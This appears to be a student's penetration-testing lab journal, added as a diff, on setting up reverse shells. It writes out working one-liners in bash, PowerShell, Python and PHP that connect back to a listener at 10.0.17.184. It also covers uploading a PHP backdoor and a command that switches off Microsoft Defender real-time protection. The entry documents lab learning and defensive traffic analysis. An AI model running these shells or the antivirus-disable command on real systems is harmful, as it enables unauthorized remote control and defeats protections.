@@ -1,0 +1,83 @@
+# Technical Journal Entry: Reverse Shell Techniques
+
+## Introduction
+- **Purpose**: Documenting the setup and use of reverse shells to gain remote access to target systems during penetration testing.
+- **Overview**: Explanation of reverse shells, including their function (initiating a connection from the target to the attacker) and use cases in scenarios where incoming connections to the target are blocked by firewalls.
+
+---
+
+## Techniques Used
+
+### 1. Setting Up a Bash Reverse Shell on sec335-rocky
+   - **Commands**:
+     - SSH login to `sec335-rocky` using Kali.
+     - Determined DHCP IP address on Kali with `ip a`.
+     - Created a Netcat listener on port 4449 with:
+       ```bash
+       nc -lvnp 4449
+       ```
+     - Initiated a bash reverse shell from `sec335-rocky`:
+       ```bash
+       bash -i >& /dev/tcp/10.0.17.184/4449 0>&1
+       ```
+   - **Outcome**: Successfully connected back to the Kali listener, allowing command-line interaction with `sec335-rocky` from the Kali machine.
+
+### 2. Traffic Analysis of Bash Reverse Shell with Wireshark
+   - **Steps**:
+     - Started Wireshark on Kali with a capture filter `tcp port 4449`.
+     - Entered a few commands in the Netcat session to capture packets.
+     - Followed the TCP stream to analyze packet data and confirm successful command execution over the network.
+   - **Outcome**: Captured and analyzed the reverse shell traffic, identifying commands and responses.
+
+### 3. Testing Reverse Shell on Pippen using PHP Webshell
+   - **Setup**:
+     - Uploaded a PHP backdoor (`simple-backdoor.php`) to Pippen, configured to initiate a reverse shell to the Kali listener.
+     - Created a small shell script with curl commands to invoke the reverse shell from the web interface.
+   - **Challenges**: Ensuring the PHP script executed correctly without interference from web application protections.
+   - **Outcome**: Successfully caught the reverse shell connection on Kali, validated remote command execution.
+
+### 4. Windows PowerShell Reverse Shell
+   - **Commands**:
+     - Ran the PowerShell reverse shell command via `cmd.exe` on the Windows target.
+       ```powershell
+       powershell -c "$client = New-Object System.Net.Sockets.TcpClient('10.0.17.184', 4449); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535 | % {0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i); $sendback = (iex $data 2>&1 | Out-String); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte, 0, $sendbyte.Length); $stream.Flush() }; $client.Close()"
+       ```
+     - **Disabling Microsoft Defender**: Turned off Defender temporarily to allow PowerShell code execution without interruption.
+       ```powershell
+       Set-MpPreference -DisableRealtimeMonitoring $true
+       ```
+   - **Outcome**: Successfully gained a reverse shell on the Windows target after disabling antivirus.
+
+### 5. Python and PHP Reverse Shell Attempts on Linux
+   - **Commands**:
+     - For Python3 reverse shell:
+       ```bash
+       python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.17.184",4449));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+       ```
+     - For PHP reverse shell:
+       ```php
+       php -r '$sock=fsockopen("10.0.17.184",4449);exec("/bin/sh -i <&3 >&3 2>&3");'
+       ```
+   - **Outcome**: Successfully connected using both Python and PHP scripts, executed commands remotely.
+
+---
+
+## Challenges and Observations
+
+- **Firewall and AV Detection**: Microsoft Defender flagged PowerShell-based reverse shells, requiring real-time protection to be disabled temporarily.
+- **Network Latency**: Observed delays in command execution in some cases, possibly due to network latency or limitations of the shell environment.
+- **Compatibility Issues**: Some shells (e.g., PHP on certain environments) required specific configurations or permissions to function correctly.
+
+---
+
+## Reflections and Areas for Further Exploration
+
+- **Improving Stealth**: Explore techniques to evade AV detection without disabling protections. Look into encoding, obfuscation, and encryption methods.
+- **Alternative Shells**: Consider testing advanced reverse shell techniques, such as using encrypted communications or multi-stage payloads for added complexity.
+- **Log Analysis**: Gain experience in detecting reverse shells from the defender’s perspective, examining Windows Event logs, and Linux system logs to identify anomalies.
+
+---
+
+## Conclusion
+This lab offered hands-on experience with different reverse shell techniques on Linux and Windows, highlighted the importance of handling AV detection, and allowed exploration of multiple languages and commands for reverse shells.
+
